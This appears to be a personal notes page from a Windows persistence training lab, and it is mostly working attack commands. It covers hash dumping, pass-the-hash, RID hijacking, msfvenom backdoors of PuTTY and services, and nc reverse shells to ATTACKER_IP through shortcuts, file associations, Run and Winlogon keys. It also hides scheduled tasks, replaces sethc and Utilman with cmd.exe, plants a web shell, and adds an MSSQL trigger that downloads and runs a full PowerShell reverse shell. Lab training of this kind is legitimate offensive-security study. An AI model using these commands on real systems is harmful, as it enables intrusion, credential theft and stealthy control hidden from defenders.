---
title: "Windows Local Persistence"
date: 2026-04-01
weight: 6
---

## Tampering with Unprivilaged Accounts
- To make it harder for the blue team to detect after initial foothold, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.
### Assign Group Memberships
- Asuuming we have already dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.
    ```powershell
    #The direct way to make an unprivileged user gain admin privileges is to make it part of the Administrators group.
    net localgroup administrators thmuser0 /add

    # If this looks too suspicious, we can use the Backup Operators group. 
    # Users in this group won't have administrative privileges, 
    # but will be allowed to read/write any file or registry key on the system, ignoring any configured DACLs.
    net localgroup "Backup Operators" thmuser1 /add

    # Since this is an unprivileged account, it cannot RDP or WinRM back to the machine unless we add it to the RDP or Remote Management Users (WinRM) groups.
    net localgroup "Remote Desktop Users" thmuser2 /add
    ```

- If we tried to connect right now from your attacker machine, we'd be surprised to see that even if we are on the Backups Operators group, we wouldn't be able to access all files as expected. 
- This is due to User Account Control (UAC). One of the features implemented by UAC, `LocalAccountTokenFilterPolicy`, strips any local account of its administrative privileges when logging in remotely. While you can elevate your privileges through UAC from a [graphical user session], if you are using WinRM, you are confined to a limited access token with no administrative privileges.
- To be able to regain administration privileges from your user, we'll have to disable `LocalAccountTokenFilterPolicy` by changing the following registry key to 1:
    ```bash
    # Attacker's machine
    evil-winrm -i 10.48.148.115 -u thmuser1 -p Password321
    > whoami /groups
    # may not see the privilages, to get it, we have to disable the LocalAccountTokenFilterPolicy
    > C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
    > whoami /groups
    # proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
    > reg save hklm\system system.bak
    > reg save hklm\sam sam.bak
    > download system.bak
    > download sam.bak

    # With those files, we can dump the password hashes for all users using secretsdump.py 
    impacket-secretsdump -sam sam.bak -system system.bak LOCAL
    # We are expected to see the all password hash dumps.
    # perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
    evil-winrm -i 10.48.148.115 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
    ```

  
### Special Privileges and Security Descriptors
- A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. 
- Special groups are only special because the operating system assigns them specific privileges by default. Privileges are simply the capacity to do a task on the system itself. They include simple things like having the capabilities to shut down the server up to very privileged operations like being able to take ownership of any file on the system. 
- In the case of the Backup Operators group, it has the following two privileges assigned by default:
    - SeBackupPrivilege: The user can read any file in the system, ignoring any DACL in place.
    - SeRestorePrivilege: The user can write any file in the system, ignoring any DACL in place.
- We can assign such privileges to any user, independent of their group memberships. To do so, we can use the `secedit` command. 
    ```powershell
    # First, we will export the current configuration to a temporary file:
    secedit /export /cfg config.inf
    # We open the file and add our user to the lines in the configuration regarding the `SeBackupPrivilege` and `SeRestorePrivilege`:
    # We finally convert the .inf file into a .sdb file which is then used to load the configuration back into the system:
    secedit /import /cfg config.inf /db config.sdb
    secedit /configure /db config.sdb /cfg config.inf
    # We should now have a user with equivalent privileges to any Backup Operator
    ```

- The user still can't log into the system via WinRM, so let's do something about it. Instead of adding the user to the Remote Management Users group, we'll change the `security descriptor` associated with the `WinRM service` to allow `thmuser2` to connect. Think of a security descriptor as an ACL but applied to other system facilities.
- To open the configuration window for WinRM's security descriptor, you can use the following command in Powershell:
  - `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI`
  - This will open a window where you can add `thmuser2` and assign it full privileges to connect to WinRM.
  - Once we have done this, our user can connect via WinRM. Since the user has the SeBackup and SeRestore privileges, we can repeat the steps to recover the password hashes from the SAM and connect back with the Administrator user.
  - If we check our user's group memberships with `net user thmuser2`, it will look like a regular user. Nothing suspicious at all!

### RID Hijacking
- Another method to gain administrative privileges without being an administrator is changing some registry values to make the operating system think you are the Administrator.
- When a user is created, an identifier called Relative ID (RID) is assigned to them. The RID is simply a numeric identifier representing the user across the system. 
- When a user logs on, the `LSASS process` gets its RID from the SAM registry hive and creates an access token associated with that RID. If we can tamper with the registry value, we can make windows assign an Administrator access token to an unprivileged user by associating the same RID to both accounts.
- In any Windows system, the default Administrator account is assigned the RID = 500, and regular users usually have RID >= 1000.
- To find the assigned RIDs for any user, you can use the following command:
```powershell
wmic useraccount get name,sid
Name                SID
# Administrator       S-1-5-21-1966530601-3185510712-10604624-500
# DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
```
- The RID is the last bit of the SID (500 for Administrator). The SID is an identifier that allows the operating system to identify a user across a domain.
- Now we only have to assign the RID=500 to thmuser3. To do so, we need to access the SAM using `Regedit`. The SAM is restricted to the SYSTEM account only, so even the Administrator won't be able to edit it. To run `Regedit` as SYSTEM, we will use `psexec`, available in `C:\tools\pstools` in your machine:
    ```powershell
    cd C:\tools\pstools
    PsExec64.exe -i -s regedit
    ```
- From Regedit, we will go to `HKLM\SAM\SAM\Domains\Account\Users\` where there will be a key for each user in the machine. Since we want to modify `thmuser3`, we need to search for a key with its RID in hex (`1010` = `0x3F2`). Under the corresponding key, there will be a value called F, which holds the user's effective RID at position 0x30: 
- Notice the RID is stored using little-endian notation, so its bytes appear reversed. Instead of `03F2`, we see `F203`.
- We will now replace those two bytes with the RID of Administrator in hex (500 = 0x01F4), switching around the bytes (F401):
- The next time thmuser3 logs in, LSASS will associate it with the same RID as Administrator and grant them the same privileges.






## Backdooring Files
- By performing some modifications to some commonly used files, we can plant backdoors that will get executed whenever the user accesses them. Since we don't want to create any alerts that could blow our cover, the files we alter must keep working for the user as expected.

### Executables files
- If you find any executable laying around the desktop, the chances are high that the user might use it frequently. Suppose we find a shortcut to PuTTY lying around. If we checked the shortcut's properties, we could see that it (usually) points to C:\Program Files\PuTTY\putty.exe. From that point, we could download the executable to our attacker's machine and modify it to run any payload we wanted.
- We can easily plant a payload of our choice in any .exe file with msfvenom. The binary will still work as usual but execute an additional payload silently by adding an extra thread in your binary. To create a backdoored putty.exe, we can use the following command:
    ```bash
    # The resulting puttyX.exe will execute a reverse_tcp meterpreter payload without the user noticing it. 
    msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
    ```

### Shortcut files
- If we don't want to alter the executable, we can always tamper with the shortcut file itself. Instead of pointing directly to the expected executable, we can change it to point to a script that will run a backdoor and then execute the usual program normally.
- Before hijacking the shortcut's target, let's create a simple Powershell script in C:\Windows\System32 or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties:
    ```powershell
    # backdoor.ps1
    Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4444"
    C:\Windows\System32\calc.exe
    ```
- Be sure to point the icon back to the original executable so that no visible changes appear to the user. We also want to run our script on a hidden window, for which we'll add the `-windowstyle hidden` option to Powershell. 
- Now change shortcut's target from the original executable to our backdoor script: `powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1`


### Hijacking File Associations
- We can hijack any file association to force the operating system to run a shell whenever the user opens a specific file type.
- The default operating system file associations are kept inside the registry, where a key is stored for every single file type under `HKLM\Software\Classes\`
- Let's say we want to check which program is used to open `.txt` files; we can just go and check for the `.txt` subkey and find which `Programmatic ID` (ProgID) is associated with it. A `ProgID` is simply an identifier to a program installed on the system. For `.txt` files, we will have the following ProgID: `HKLM\Software\Classes\.txt\shell\open\command` --> `%SystemRoot%\system32\NOTEPAD.EXE %1`. 
- In this case, when you try to open a `.txt` file, the system will execute `%SystemRoot%\system32\NOTEPAD.EXE %1`, where `%1` represents the name of the opened file. If we want to hijack this extension, we could replace the command with a script that executes a backdoor and then opens the file as usual. 
- Now lets change the `.txt` file association to point to our backdoor script: `C:\windows\backdoor2.ps1`
    ```powershell
    # C:\windows\backdoor2.ps1
    Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4444"
    C:\Windows\System32\NOTEPAD.EXE $args[0]
    ```


## Abusing Services
- Windows services offer a great way to establish persistence since they can be configured to run in the background whenever the victim machine is started. If we can leverage any service to run something for us, we can regain control of the victim machine each time it is started.
- A service is basically an executable that runs in the background. When configuring a service, you define which executable will be used and select if the service will automatically run when the machine starts or should be manually started.
### Creating backdoor services
- We can create and start a service named "THMservice" using the following commands
    ```powershell
    # The "net user" command will be executed when the service is started, 
    # resetting the Administrator's password to Passwd123.
    sc.exe create THMservice binPath= "net user Admistrator Password123" start= auto
    sc.exe start THMservice
    ```
- We can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. 
    ```
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe

    # Create and start the service
    sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
    sc.exe start THMservice2
    ```


### Modifying existing services
- We may want to reuse an existing service instead of creating one to avoid detection. Usually, any disabled service will be a good candidate, as it could be altered without the user noticing it.
    ```powershell
    sc.exe query state=all
    # find the stopped service, and find its configuration
    sc.exe qc THMService3
    ```
- There are three things we care about when using a service for persistence:
  - The executable (`BINARY_PATH_NAME`) should point to our payload.
  - The service `START_TYPE` should be `automatic` so that the payload runs without user interaction.
  - The `SERVICE_START_NAME`, which is the account under which the service will run, should preferably be set to `LocalSystem` to gain SYSTEM privileges.
    ```bash
    # Attackers machine
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
    nc -nlvp 5558

    # Target machine
    # reconfigure "THMservice3" parameters, 
    sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
    sc.exe qc THMservice3 
    sc.exe start THMservice3
    ```

## Abusing Scheduled Tasks
- We can also use scheduled tasks to establish persistence if needed. There are several ways to schedule the execution of a payload in Windows systems. 

### Task Scheduler
- The task scheduler allows for granular control of when your task will start, allowing you to configure tasks that will activate at specific hours, repeat periodically or even trigger when specific system events occur. 
- From the command line, you can use schtasks to interact with the task scheduler. A complete reference for the command can be found on [Microsoft's website](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks)
    ```powershell
    # create a task that runs a reverse shell every single minute. 
    # /sc -> schedule (minute, hourly, daily, etc.)
    # /mo -> interval ( if /sc minute, /mo is the number of minutes)
    # /tn -> task name
    # /tr -> task command
    # /ru -> run as user (SYSTEM)
    schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "C:\windows\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM 

    # check if task is created
    schtasks /query /tn thm-taskbackdoor
    ```

### Making Our Task Invisible
- Our task should be up and running by now, but if the compromised user tries to list its scheduled tasks, our backdoor will be noticeable.
- To further hide our scheduled task, we can make it invisible to any user in the system by deleting its `Security Descriptor (SD)`. The security descriptor is simply an ACL that states which users have access to the scheduled task. If your user isn't allowed to query a scheduled task, you won't be able to see it anymore, as Windows only shows you the tasks that you have permission to use.
- Deleting the SD is equivalent to disallowing all users' access to the scheduled task, including administrators.
- The security descriptors of all scheduled tasks are stored in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. You will find a registry key for every task, under which a value named `SD` that contains the security descriptor. You can only erase the value if you hold SYSTEM privileges.
- To hide our task, let's delete the SD value for the "THM-TaskBackdoor" task we created before. To do so, we will use psexec  to open Regedit with SYSTEM privileges: 
    ```powershell
    # open regedit with sys-priv, and erase the value of SD for THM-TaskBackdoor
    c:\tools\pstools\PsExec64.exe -s -i regedit
    # then try to query the task again, hope you will not see it anymore
    schtasks /query /tn thm-taskbackdoor

    # if all goes well, start listening on attacker's machine
    nc -lvnp 4449
    ```

## Logon Triggered Persistance
- Some actions performed by a user might also be bound to executing specific payloads for persistence.

### Startup folder
- Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in. 
- An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.
- If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.
    ```bash
    # attackers machine
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
    python3 -m http.server 
    nc -lvnp 4450

    # target machine
    wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
    copy revshell.exe 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\'
    # now whenever any user logs in, the payload will be executed
    # And you will get the reverse shell
    ```

### Run/RunOnce
- We can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, we can use the following registry entries to specify applications to run at logon:
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
  - `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

- The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.
    ```bash
    # Attacker machine
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
    python3 -m http.server
    nc -lvnp 4451

    # Target machine
    wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
    # \v -> Name, /t -> Type, /d -> Data, /f -> Force
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "MyBackdoor" /t REG_EXPAND_SZ /d "C:\Users\user\Documents\revshell.exe" /f
    # sign out and sign 
    # GEt the reverse shell
    ```

### Winlogon
- Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).
- Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:
    - Userinit points to `userinit.exe`, which is in charge of restoring your user profile preferences.
    - shell points to the system's shell, which is usually `explorer.exe`.
- If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.
    ```bash
    # Attacker machine
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
    python3 -m http.server
    nc -lvnp 4452

    # Target machine
    wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
    move revshell.exe "C:\Windows\Temp"
    # \v -> Name, /t -> Type, /d -> Data, /f -> Force
    reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit" /t REG_SZ /d "C:\Windows\System32\userinit.exe, C:\Windows\Temp\revshell.exe" /f
    # sign out and sign 
    # GEt the reverse shell
    ```

### Logon scripts
- One of the things `userinit.exe` does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.
- Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.
    ```bash
    # Attacker machine
    msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
    python3 -m http.server
    nc -lvnp 4453

    # Target machine
    wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
    move revshell.exe C:\Windows\
    # \v -> Name, /t -> Type, /d -> Data, /f -> Force
    # Create UserInitMprLogonScript Under `HKCU\Environment`
    reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_EXPAND_SZ /d "C:\Windows\revshell.exe" /f
    # sign out and sign 
    # GEt the reverse shell
    ```


## Backdooring Login Screen / RDP
- If we have physical access to the machine, we can backdoor the login screen to access a terminal without having valid credentials for a machine.
### Sticky Keys
- When pressing key combinations like `CTRL + ALT + DEL`, you can configure Windows to use sticky keys, which allows you to press the buttons of a combination sequentially instead of at the same time.
- In that sense, if sticky keys are active, you could press and release `CTRL`, press and release `ALT` and finally, press and release `DEL` to achieve the same effect as pressing the `CTRL + ALT + DEL` combination.

- To establish persistence using Sticky Keys, we will abuse a shortcut enabled by default in any Windows installation that allows us to activate Sticky Keys by pressing `SHIFT 5 times`. After inputting the shortcut, we should usually be presented with a screen that looks as follows:
- After pressing `SHIFT 5 times`, Windows will execute the binary in `C:\Windows\System32\sethc.exe`. If we are able to replace such binary for a payload of our preference, we can then trigger it with the shortcut. Interestingly, we can even do this from the login screen before inputting any credentials. 
- A straightforward way to backdoor the login screen consists of replacing `sethc.exe` with a copy of `cmd.exe`. That way, we can spawn a console using the sticky keys shortcut, even from the login screen.
- To overwrite `sethc.exe`, we first need to take ownership of the file and grant our current user permission to modify it. Only then will we be able to replace it with a copy of `cmd.exe`. 
    ```powershell
    takeown /f C:\Windows\System32\sethc.exe
    icacls C:\Windows\System32\sethc.exe /grant Administrator:F
    copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
    # After doing so, lock your session from the start menu
    # We should now be able to press SHIFT five times to access a terminal 
    # with SYSTEM privileges directly from the login screen
    ```

### Utilman
- Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen
- When we click the ease of access button on the login screen, it executes `C:\Windows\System32\Utilman.exe` with SYSTEM privileges. If we replace it with a copy of `cmd.exe`, we can bypass the login screen again. To replace `utilman.exe`, we do a similar process to what we did with `sethc.exe`:
    ```powershell
    takeown /f C:\Windows\System32\Utilman.exe
    icacls C:\Windows\System32\Utilman.exe /grant Administrator:F
    copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
    # After doing so, lock your session from the start menu
    # We should now be able to click the ease of access button to access a terminal 
    # with SYSTEM privileges directly from the login screen
    ```

## Persisting Through Existing Services
- If you don't want to use Windows features to hide a backdoor, you can always profit from any existing service that can be used to run code for you.
### Using Web Shells
- The usual way of achieving persistence in a web server is by uploading a web shell to the web directory. This is trivial and will grant us access with the privileges of the configured user in `IIS`, which by default is `iis apppool\defaultapppool`.
- Even if this is an unprivilaged user, it has the special `SeImpersonatePrivilege`, providing an easy way to escalate to the Adminstrator using various known exploits.
- Let's start by downloading an ASP.NET web shell. A ready to use web shell is provided [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx), but feel free to use any you prefer. Transfer it to the victim machine and move it into the webroot, which by default is located in the `C:\inetpub\wwwroot` directory:
    ```powershell
    # Download the web shell
    curl -o shell.aspx https://raw.githubusercontent.com/tennc/webshell/master/fuzzdb-webshell/asp/cmdasp.aspx
    # Move it to the webroot
    move shell.aspx C:\inetpub\wwwroot\
    ```
- Note: Depending on the way you `create/transfer` shell.aspx, the permissions in the file may not allow the web server to access it. If you are getting a Permission Denied error while accessing the shell's URL, just grant everyone full permissions on the file to get it working. You can do so with `icacls shell.aspx /grant Everyone:F`.
- We can then run commands from the web server by pointing to the following URL: `http://<victim_ip>/shell.aspx`
- While web shells provide a simple way to leave a backdoor on a system, it is usual for blue teams to check file integrity in the web directories. Any change to a file in there will probably trigger an alert.

### Using MSSQL as a Backdoor
- There are several ways to plant backdoors in MSSQL Server installations. For now, we will look at one of them that abuses triggers. 
- Simply put, triggers in MSSQL allow you to bind actions to be performed when specific events occur in the database. Those events can range from a user logging in up to data being inserted, updated or deleted from a given table. 
- For this task, we will create a trigger for any INSERT into the HRDB database.
- Before creating the trigger, we must first reconfigure a few things on the database. First, we need to enable the `xp_cmdshell` stored procedure. `xp_cmdshell` is a stored procedure that is provided by default in any MSSQL installation and allows you to run commands directly in the system's console but comes disabled by default.
- To enable it, let's open Microsoft SQL Server Management Studio 18, which is available from the start menu. When asked for authentication, just use **Windows Authentication** (the default value), and you will be logged in with the credentials of your current Windows User. By default, the local Administrator account will have access to all DBs.
- Once logged in, click on the `New Query` button to open the query editor
- Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable xp_cmdshell:
    ```sql
    sp_configure 'Show Advanced Options',1;
    RECONFIGURE;
    GO

    sp_configure 'xp_cmdshell',1;
    RECONFIGURE;
    GO
    ```
- After this, we must ensure that any website accessing the database can run `xp_cmdshell`. By default, only database users with the `sysadmin` role will be able to do so. Since it is expected that web applications use a restricted database user, we can grant privileges to all users to impersonate the `sa` user, which is the default database administrator:
    ```sql
    USE master
    GRANT IMPERSONATE ON LOGIN::sa to [Public];
    ```
- After all of this, we finally configure a trigger. We start by changing to the HRDB database:
    ```sql
    USE HRDB
    ```
- Our trigger will leverage `xp_cmdshell` to execute Powershell to download and run a `.ps1` file from a web server controlled by the attacker. The trigger will be configured to execute whenever an  `INSERT` is made into the `Employees` table of the `HRDB` database:
    ```sql
    CREATE TRIGGER [sql_backdoor]
    ON HRDB.dbo.Employees 
    FOR INSERT AS

    EXECUTE AS LOGIN = 'sa'
    EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
    ```
- Now that the backdoor is set up, let's create evilscript.ps1 in our attacker's machine, which will contain a Powershell reverse shell:
    ```powershell
    $client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);

    $stream = $client.GetStream();
    [byte[]]$bytes = 0..65535|%{0};
    while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
        $sendback = (iex $data 2>&1 | Out-String );
        $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
        $stream.Write($sendbyte,0,$sendbyte.Length);
        $stream.Flush()
    };

    $client.Close()
    ```
- We will need to open two terminals to handle the connections involved in this exploit:
  - The trigger will perform the first connection to download and execute `evilscript.ps1`. Our trigger is using port 8000 for that.
  - The second connection will be a reverse shell on port 4454 back to our attacker machine.

    ```bash
    # attack machine
    python3 -m http.server
    nc -nlvp 4454
    ```
- With all that ready, let's navigate to `http://10.48.190.230/` and insert an employee into the web application. Since the web application will send an INSERT statement to the database, our TRIGGER will provide us access to the system's console.


## Conclusion
- While we have shown several techniques, we have only covered a small fraction of those discovered. If you are interested in learning other techniques, the following resources are available:
    - [Hexacorn](https://www.hexacorn.com/blog/category/autostart-persistence/) - Windows Persistence
    - [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Persistence.md) - Windows Persistence
    - [Oddvar Moe](https://oddvar.moe/2018/03/21/persistence-using-runonceex-hidden-from-autoruns-exe/) - Windows Persistence Through RunOnceEx
    - [PowerUpSQL](https://www.netspi.com/blog/technical/network-penetration-testing/establishing-registry-persistence-via-sql-server-powerupsql/) - SQL Server Persistence






